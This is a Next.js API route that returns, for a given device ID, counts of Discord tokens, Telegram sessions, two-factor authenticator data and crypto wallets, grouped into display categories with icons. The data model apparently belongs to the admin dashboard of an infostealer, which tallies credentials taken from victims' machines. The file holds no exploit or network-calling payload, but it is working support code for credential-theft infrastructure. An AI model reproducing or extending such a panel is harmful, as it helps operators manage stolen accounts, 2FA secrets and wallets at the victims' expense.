import { NextRequest, NextResponse } from "next/server"
import { getMessagingWalletCounts } from "@/lib/db-messaging-helpers"

/**
 * GET /api/v1/messaging/stats/[deviceId]
 * Get statistics for all messaging & wallet data for a specific device
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } },
) {
  try {
    const { deviceId } = params

    if (!deviceId) {
      return NextResponse.json({ error: "Device ID is required" }, { status: 400 })
    }

    const counts = await getMessagingWalletCounts(deviceId)

    const total =
      counts.discord_tokens +
      counts.telegram_sessions +
      counts.authenticator_data +
      counts.crypto_wallets

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      total_items: total,
      counts: {
        discord_tokens: counts.discord_tokens,
        telegram_sessions: counts.telegram_sessions,
        authenticator_data: counts.authenticator_data,
        crypto_wallets: counts.crypto_wallets,
      },
      categories: [
        {
          name: "Discord Tokens",
          count: counts.discord_tokens,
          icon: "🎮",
          color: "blue",
        },
        {
          name: "Telegram Sessions",
          count: counts.telegram_sessions,
          icon: "📱",
          color: "sky",
        },
        {
          name: "2FA/Authenticator",
          count: counts.authenticator_data,
          icon: "🔐",
          color: "green",
        },
        {
          name: "Crypto Wallets",
          count: counts.crypto_wallets,
          icon: "💰",
          color: "yellow",
        },
      ],
    })
  } catch (error) {
    console.error("Error fetching messaging/wallet stats:", error)
    return NextResponse.json(
      { error: "Failed to fetch statistics" },
      { status: 500 },
    )
  }
}
